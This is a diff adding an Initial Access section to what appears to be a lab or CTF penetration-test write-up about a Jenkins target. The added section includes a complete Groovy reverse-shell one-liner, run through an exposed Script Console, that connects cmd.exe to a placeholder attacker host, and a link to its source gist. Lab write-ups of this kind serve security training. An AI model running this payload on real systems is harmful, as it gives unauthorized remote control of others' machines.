@@ -90,6 +90,14 @@ SMB access was restricted, but weak security settings were later leveraged with 
 
 ## 6. Initial Access
 
+The Jenkins Script Console was accessible and allowed arbitrary Groovy script execution. A reverse shell was executed through the console.
+
+```
+String host="<attacker-ip>"; int port=<listener-port>; String cmd="cmd.exe"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+This resulted in a shell as the `jeeves\kohsuke` user.
+
 ---
 
 ## 7. Post-Exploitation
@@ -109,3 +117,6 @@ SMB access was restricted, but weak security settings were later leveraged with 
 ---
 
 ## 11. Appendix
+
+Groovy Script Reverse Shell -
+[https://gist.github.com/rootsecdev/273f22a747753e2b17a2fd19c248c4b7](https://gist.github.com/rootsecdev/273f22a747753e2b17a2fd19c248c4b7)
